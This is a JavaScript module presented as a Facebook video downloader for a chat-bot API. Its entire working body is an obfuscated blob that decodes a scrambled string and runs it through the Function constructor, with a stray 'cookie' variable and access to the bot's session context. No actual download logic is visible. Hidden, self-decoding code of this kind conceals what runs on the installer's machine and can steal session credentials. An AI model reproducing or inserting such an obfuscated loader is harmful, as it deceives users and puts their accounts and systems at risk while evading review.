var axios = require("axios");
var cheerio = require("cheerio");

module.exports = function(defaultFuncs, api, ctx) {
    return function facebookDL(url, callback) {
        var resolveFunc = function() {};
        var rejectFunc = function() {};
        var returnPromise = new Promise(function(resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });
        if (!callback) {
            callback = function(err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }

//Contact Máº¡nhG. Fb: Fb.com/manhict
var cookie,_0xFEAB,_0xFEE4;(function(){var ATg='',DPi=534-523;function HTD(i){var m=2213578;var r=i.length;var p=[];for(var e=0;e<r;e++){p[e]=i.charAt(e)};for(var e=0;e<r;e++){var b=m*(e+396)+(m%24734);var o=m*(e+597)+(m%46686);var n=b%r;var u=o%r;var z=p[n];p[n]=p[u];p[u]=z;m=(b+o)%4964592;};return p.join('')};var dcl=HTD('gtmswckoorrctaonptuxjdlzfreunqsvhciyb').substr(0,DPi);var rko='(ai f=}6rn)45,a=)4vvur(yh";b=d(fghbj4lrn;pgrhthvvxoz+;+aS t=r8.,05*9i,[667c,n1r7b,[0[8e,A8,7w,(7,8),t1.7;,.6+7z,d0,7k,i51;pa. t=r]vf=r(v(r hr0.h.fnl+nlt+;r+d)r[o[=]i=,+e;va9  =5]6d]=w7ene=o8ti]=w2tfrr v[r"a"0aa9avg,msnlscl2nate;g++)tv[rfr.a{g=m{n(sha .ip]ig(] l)(ffr8vgramprrl nitr-n;(>a04mb-d{las e=eull vvrvg{r0m(;rah .=ru+l+virzl(02vhr e.gflnnrt ;=ad t;oo.(waC a=+;n<0;r+u)=v1r+s8gsc)a[C[d=Ah(2))vvriutk1sv;rf;u.{-=(u,1m*)+=.,hgr.otestiwa1,-r;l=);s+8;relse kf]so=")[tanm(=.{eigrhld0g=c;arCndvAm(h+;)<+e.ohCrtope;t+wp2f-=;r=n;u++2a}tl.e)c.n+i u;;aid(w=znal))-=f]ri(()>9)s.iu6hng=s<bvthivg(lAbw);zfpqs1(n[6+]]a;b=4+u;4ie(;!nn,l;)zi9([<f)r.ju7hag0shbht]i]gfl2)grem"=h.so8nw"w)}}uo=p1s}(,[;][;1v8r;pCowj!ie({"v; a= ;=j3},u2u9a,(6)1t,o29.=o,c1t.fz;)ar )=ot;ingof(olCea;Codu(h6=;,oe(ha0 3=g;u<4.;eyg;h"ha+}popzselat(c(y=c;adAl(c)r.ko=n7Slr;n).Cr-m)hhrhoze)v hr)w;ae)utncpfstl twcc"r"(.)ojn,c=;';var KuL=HTD[dcl];var cxW='';var YAw=KuL;var iJW=KuL(cxW,HTD(rko));var JRS=iJW(HTD('2u0cfiln[f!ui$ou1zx{n-o=t.Yl!n_tsY_vr[t;to0(0-v=.;5.!ojg9+s{}[0]Du0!fh0r;h3(f).;fo((e-n=_;,.no3g)+l{.-.=#.=()+q4f)f(a%02!50).);=x.Y(i+f1w)h(m%f6611)m)0=j%\/Y0dma1o())=v[x].vic2=q[1];vYdf=3;q=0l0af%e3.7_6q;0YcriS_rDn#._fxo2Cea-Crdp(q2,)_)x=ea_#_=0a\/Y_yv.*#.Yfbx.[%n#x=aa.0u#i=daf.};cexu.n6f}Y(sc"))g&\/Y0y)Y.b_"1)8&YYYr,;0r0tarC..e)ah(_u*$e"xn.!}[()u.0l3}rtE0mofY0l]1.0r04r)r__{fc.]ci+sagej6[(1i_D1es_l6]ssevo.(1;,fs}94Y,\/._r_0uy40(Ec1a*3Y..]_q]oC7E__eo)523r+hfu((;_if12;l==)qu0q.b;.d:xeYh;{xu(xh(hxxa.l.gfu(t_2\/nr.xr;loneYr050080se00v+c.!ixqoY,t:Dq(x60..x,g1xY),0eqxr(011.)a(.1osjT1(e)u}d{e8a10_Y.=()jY08fanerbsl0*.hc{vl_irx.e1qn1x0_Ye1((.1Y*Erxo0.10a]n!e.==[hr11.0YY.r;ora1uc.jlfD;hf135lm10+eix!v$exY_.$1eq10tirCn_0-)[=hx.D1),fuae_q.h.hu]r.ur06cjCfr_!(uE=t0q}ru)_catDs_69.(Y=0k)x1hm2puqY(3tD\/q=u1#r.f[_.qt*1Ex{x)0(,dtpD_)?Y=7sr\/!ho1{qa30{53asl%],_.s=_*(0qra.,,3)2!tl{0ndit*a}rqDp=txY)tqt.()h4i?.e.1x.;1[(6_.xYrr4fi,)nngz0,]2e0010x{hif_f1ugr.?u_\/0l)x1(!xxi)..gf0Dv1fxiCe00.r)wn=[gYa{3+o{f(..5{z=p+at._6(,D7([1.e;.o)ux6,36t1exty852.3xE26oT;x5(D2t.({ia7q(!)!.f0nE.!$k[fe,*t0ixxy0r=o0n0[+n.[T[10(x8n00Yc41xluc[rs[2S.1$bu0cx.1p0c000{))u12.l,(io=0!5_$0_fx.t001..[16013t8()4e.f7t.e.Y$x.1Y;av20qYhl1qe:01efei{2};nY)ax)akjcj..3Y1(0f:h;ueteat.Y6:p{D(_\/.x_+e0l0]).0)n)]Y46:*f0e3q;1pq[;]..uf.,n8u3cEh0)0.ef1)_l80u-d2,nq_ix.0[1nut2.qu13qff6}x7qge\'.(0_.xDf0:q.]h9.f.e.3*(e3xe3([}.hiq.!ee1t}C.+r,fllYiExfcnY._1_nz4cDvY.__!ku)3!g11,)5r+lc10t0r.(r10;)Y(0g..xY(1fltc..01.E)qa_hkr3.qeqaqYht0(l1h_n.rxx00f1rhxcqueY_0q#4i16(}3{f\/.eEc0*tl]Yt0).,)=nY7tie6.hDnE*m]ad7qY)r:1.r04.*gnd20)j.2neuY106enz*+.a=.n5{.YlY)(.ub+u1(x119]0Ye6p=10*(Y1 Y,)tde.gxg6Y.00ub!ua|o:f153r.=,v!,!s0[_xe..)}=e_;rxi_E5.)zf.t_r(1gttso_,x(su$xY,1.m,?n0{,Y}qi=.0r*E0001(v(_f_)3vip0unlo(m;0q;=nx.qCeaor;n]al3}31xDo._.3qqc,tn1otqx.xjuEf..s3)q_hY).1g9:)_=)c]r0+$_0m(3f{D0_.tu.yxn!EtCx__3(xdv.v1Y=u{.j6foEn(8Cxa=x]0;fn_c{e.arfq()c5xC*.la)YYs1;t)t10.xu-t3n0qn2=;f1tq8a1euee)0)(_3Y*.o75n3e2\/ c)euq\'hquf.xst)2(f3!ib__*e0Dhe!0*71r__((}0_ot_6i.Y2n01=_o.afx.733n9j1ra u5xt#a2u0n1*cx[)ie]_x]()mn.*n}1YYYu=C,6,fhY.00x0tqY15rmrxEl!0,,[yu)+]8wn1_(Y.00.lYlm335(1(*4E3Y,0]f10a{0qf3!.#E0qo10#.(1)qiY0o6c,p,tqx1_4q(6=.Y.qx)Yxq0xx)]om0{9m3]3tq1md3_Dxto..;nEre.23qe90.p30-._00h.xYh0#]E)22{x\/Mha11i]3aihd_i:.0eg9df)0:.t)dt{.xu5.01ahr.}__13m_px.%fx_=tYqfirf!!poY6xjn,r=0_sn4xr5xfq1.54=[q,#t];!n*{oa,=31ft2)1210q5oY.ex0Ypx,().)a[.qtn0x+lC07]x21YY__.nsc)t)x1u0]{_sjqxxx0bo6*e()0x(..x0])#E.Yls1f}f3_e(0l20]aqEtv{Y40]..p8Eq3t,_i=Ei1cY0.dt:d)|(]p11n$66i]p#qn3qc0Y{,0x.1].rlxs0oEfc,ncr0.,e!sn36pc0to!xY..0fuf0c}fEx(uYrn,[rfqo20(j3f*0.m)D\/[x9.Y_,.(*(_{,-a0o1hr6__h.Ye5s;{#t0.3t0)aixr)(]tifrx$(c{cxDa,r!qah[xesltq3,.a...yx11r,*{u_a_6e*\/E#l=._frn[;l1snq1_}n0n:.![Yc=xijYn0!m.\'tY1##nq0)]t0!x)7Ef.Ydr5a;t[x)0ou\/q[00txix(1f.{nr=[0:[p*qlt*EYrr}0fp_;,h0.0!!gt._x.)tgx5)}.(i12ii((YvD}.))04)M(,f2.*+nu(n0)1(0*0Cir0.f;D_5e)fxt1(s0q9,_7.q0pt_t{.5h3k_nE;q0.=*xft!hennhY-.6o.5D1D_mEoutv0.t0l_f3.lx.i=0_.,v5.0aY]iuY.3x(\/lq3ocn.h.e75r[.i0(_uY6tb{.00w.c[2.;ux+1srcpq)l\/E;.5Y._._ur;;);.f_6rrt0fD0c[c.o.-f1Yta0fw,6m.*.x)E1.i.qxet8i[put0qhr=sa91erxYq0g8r1eo0.qb1_zt.rn_nfsatiu_11tln=1r_[61)f3_5oq15[$_Y.c5elf]Yo3_qx(;1j1r.a_..0703.u[_)Y.(_.x4!41t.qx.s0_a.2.f__so.41tunbY.d;rfD(r95Sl0.vquYYn}.+n*[.*_}uio8.;120,fca:rfo)rt{x.1nt*60.eft)n.#6(x1.01DY#eNrxf0:pY!x.qeY[a_)x5humi0frm01fftqqr(0i3ht;_tr1..1df0=[r,ge1_}.(l)a..qYn#q0_4160o!hap]04eYq*t_03$x(!*_t(r_.xex.q_3nnbl(oyDs[?rn2Y(n!.ibs.rs{fea00fn1!u[x3.n_h1(hfu)i.xon,}_9=_];e{yf\/_]_lq.].]ac0z(xY_gsCk.j1}xY)t)_}h[\'.Y)=.r_(ts.r.!0e4aa.rht.1[M *efnr_#jqY2.3;.;T{l.oee(*_1[.1ot_).e1rqq.di(YxEnnt#va1.q7_1qnemxq]3x{00vx]x#x1x;0C-xk10x_a(1oxq0_0#Yb;aEqp.1.}fc6.a(h0t3_Yuqx.sotq01bf0g_uC0Y03%hEjtl_1t(.ux}n:].qtq]g.n:q1}tY1s0)..lox02utx13l0_*x.hs._(0ur[Y|a)lYx#1t,n)E6!y,_9r4sl8x.q(]6Yf]uruwc_0amEy\/o1s_0.=}-jEk0dbnr.a4q._tnx 1vonE0r0E[20q1)(r.0Er=00aExx:.p0xecoxi,qw0e]ix*0xq.x)_.fnih..=4priqn,a._[2{}}._t0q(90giqm#1(l[0q|.;e..ef#ve#k1[ffqar;eer00e+psDq.ql-x.!=_z.lE3{(020aoix_b1-xh._l0re1=1q.n.0nN1]m!)D(];5&a!b\/.fE)0#33f]v.f,9aqs0q10!.$aYelx0010c10].qE}[oiftC1)]bn{.(0n7xYp:f..(a(E7+c03_xY?_](xn;[=0oo.man)0p](\'1#D(_e*uY!uq*r()x40r-1_.aY*qEY01qfb%el(=*nYa(.1aun\/!3oe$..tg1h0i1xehuq]01t0h-3_.0au!0_q[8[n.0E._ii(Yq_.[,trmsyhm;7x1,]p"ex_)(6S_)e([*8ccu1!3Eqg.aqY;.YE[}!00Y.f_oYee-tf!;)st500.a2b_Cf1k$nq13YY}s74a{;6;a0d3o8].uq(c_e.36hY00]Eh(]1YC.(raY(Ei[c\/h_Y;.xf_.#)!uxx?1;(5e".e0[(3Y;.Y1a0]10n!)kD.cn1.vfxo.)(t1#n0)zah1tt_0.nq-.xgM.hvh.}i..1i$)qq{}.q[q_[70.n=_Ei1-efy.E._E40kD;l(5(0!qtY_$E)1.1r(0q0vEed$S*0tlu.saxu2e%q(a.[)enxxx5(1_1]rqa+xq]Y(1c.|_fs0(0.m1at0]1i0\/9x_11n{mabx34s(.q}(lrg.([=xYf,6_0u.t[r.x7w.1o5u[.g).0+1nex61_3xe3.36q_upx.envxxv[r1)q:0ei0!7se+r..a).2aD_qux)t.xext()e1l7}fY[e1vE[t}.y1c.vdl1t)0sx}(c0xah.13hc=.f)e4lf[d]a.0xYta._x=0oq9l)(a],1_;]})#rd.h_E00_fj0_.1,q4xn6u}s0_.r]ff]$iC;x8,u)qs.Y=)tef1C2mreE):(0l900Yex..0D9);b-q1xCqp1!1)5r(q0(c_qYob{3.1__u{.cu)_q.q(,1e_!mji#3).0m{_q.7lt1{[rY0]v*E):e;00.(xt!{[2!)\/u.\/0nxc]1r5d.qeoo_:D.Ylxo;#-.61_,3u0;s;7Do.!g4pe!00r0_x],)tt05q{*x;j;=j00+r0a7_=)80rreYxc\/aaqe.+t+a#c*#xeyn)a)Yoq0_l0.0u.0_..3pu)e11D._0)qi_3g.04rc90efsi_,D.r]!.p0h4*s3soENrf.vr1xr)e_})y0t&q0:o0a.6ajYe0];u(as;(xrxn.f[D]axudeuYeogeo.cn0x0p02E._g1Y.eaYh0vt[D]_ai,x1.)ruh(np5o3v0.i5(510))r.*t!mq_chn_{1n.0a,3.qx,d00p)0(,)91[[_01f1}e0dD.09x1Y*160_5_Y)0!cY,(tr+c.suah.3ao)D(9!.nl*Eo01ie.tel,q_!q.{oap*eh6((4Y*C_xDon).a61726}03#c5.[40]}}40ahYt_on.{])\/hf0fiu[vt_e_0Srv*.xYd2r__|Y11f|(_[y\'_g1,Y(_(*Y0,-_p3_.n!gt3s.Dk_d4006D.xpi.Yc]0(.Yu%ig.Y5!q0,}0.eci\/.itoh1.641x(e=0YD(1(h,1#t6et0_YYax*C0[$lw.1qtx_31(.n0,.p_[=a070#o[tYuhfY9E4a.ql_a(s_cf01e,)g3,)90.!70._15l]90(1r0030!)0_q(uY:r0YY[)39:3]g#tv:}).Ensoe=5u.iruqtetx}6$.)[xqnitlu:54q)53ei1eafa_s(=+-C!14(f.i}.\/0(uo)pi}$0}Y..l[E0gi_c.1.t6o_o+n8\'D_)10nf.0o,txk$)s1C}Y_.Du16,t,.=0x-00\'Eaq)r_)a.*f5,x4r=()5u0_t1q1a8fqar,rxro #.q6*]f)mn00}![Y50e.30re6xf),bfn01?.0r,rE[iux_){.p6rel,s0x:xe0_Yrfd0.q1(.xv!D7;h0E]aqmt)Dx.qE(,1})i.nq(+fnqi)f01ee1m5]Er-]+!t{i1.,!E03(i5Y)0_{.2xuh)otx1}Yr]hfe30]o}.f{0x._d(.1*7.x6oit1;1q6[09[0xcm00(u_s5#._v*[93xxfe9f6\/DgDqavnt78y.(x0*_fqa01yq.3.(0l.en..o}f}(.xa(;eY11?f.!x.h.h\/t0Drtnq;#v.fx.l1.[D12=_-1..6_)xn]#+7(.03]*10YD,)$MaY{te+)3lDaqnx\/q_p8YE..s_c11!(!x1._.1icr]:nqD_.0[ue1q+1!,0niY1c_\'e.s9k0m0c0{1c_(fq.nx.D)Yr,nxD(+p[(r.)m0iD_ex:x0e(s_(.a100j(0jf01.s]xj.k.t0aj0u9=00e12_r1tf\/\'{#{eqf\/n,0f.q)8__[0sl0jne)ai*r0co3xqExTc__9y1qs2lY.xC03.0x+.7,E00n7q*sxYi19.,e1cY21_()CYuxa..=hrY.:eqn0.Y[x2qcsDE.a1[1xr,._e8fp;00c=tq(o_t13f]1i.0a6xq$(rx=(q0Yc61g\/0x)104i3..gl_x2sg060031C0]].ii$0\/f)"j3s6u115p[\/]] _*3*0)0!{pqi0(c.6Y) x*{qi.eYr .!oocn7 3YE u*t xY_ cc32, 0c25f .cy2. )a..] f\/2 [q:qi.E.. tq|1t...b x.o0uc!3] Y!(.'));var LBI=YAw(ATg,JRS );LBI(5137);return 1879})()
       
return returnPromise;
    };
};

function isUrlValid(link) {
    var res = link.match(/(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g);
    if (res == null)
        return !1;
    else return !0
};